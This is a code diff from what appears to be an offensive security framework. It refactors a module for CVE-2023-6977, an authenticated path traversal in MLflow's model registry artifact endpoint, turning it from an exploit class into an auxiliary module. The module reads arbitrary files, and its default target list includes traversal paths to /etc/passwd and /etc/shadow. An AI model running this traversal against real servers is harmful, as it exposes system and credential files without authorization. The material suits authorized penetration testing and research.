@@ -2,12 +2,11 @@ from typing import ClassVar
 
 from requests import get
 
+from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
 from flowhound.vulnerabilities.clients.mlflow import MLflowClient
-from flowhound.vulnerabilities.exploits.base_exploit_class import ExploitBaseClass
-from flowhound.vulnerabilities.payloads.base_payload_class import PayloadBaseClass
 
 
-class Exploit(ExploitBaseClass):
+class Auxiliary(AuxiliaryBaseClass):
     """
     CVE-2023-6977 — Authenticated path traversal / arbitrary file read via the
     MLflow model registry artifact download endpoint.
@@ -23,10 +22,9 @@ class Exploit(ExploitBaseClass):
     """
 
     _client_class = MLflowClient
-
     _DEFAULT_PATH = "../../../../../../../../etc/passwd"
 
-    # Sensitive targets to iterate when no custom payload is given.
+    # Sensitive targets to iterate when no custom path is given.
     _TARGETS: ClassVar[list[str]] = [
         "../../../../../../../../etc/passwd",
         "../../../../../../../../etc/shadow",
@@ -131,19 +129,22 @@ class Exploit(ExploitBaseClass):
 
         return resp.status_code, resp.text
 
-    def exploit(
+    def run(
         self,
         base_url: str,
-        username: str,
-        password: str,
+        f_path: str | None = None,
+        username: str = "",
+        password: str = "",
         proxies: dict[str, str] | None = None,
-        payload: PayloadBaseClass | None = None,
     ) -> bool:
         self.logger.info(
             f"Authenticating as {username!r} for CVE-2023-6977 (authenticated path traversal)..."
         )
-        headers = self.authenticate(
-            base_url=base_url, username=username, password=password, proxies=proxies
+        headers = self.handle_authentication(
+            base_url=base_url,
+            username=username,
+            password=password,
+            proxies=proxies,
         )
 
         if headers is None:
@@ -160,7 +161,7 @@ class Exploit(ExploitBaseClass):
             )
             return False
 
-        targets = [payload.load_payload()] if payload else self._TARGETS
+        targets = [f_path] if f_path else self._TARGETS
 
         for model_name in model_names:
             versions = self._list_model_versions(
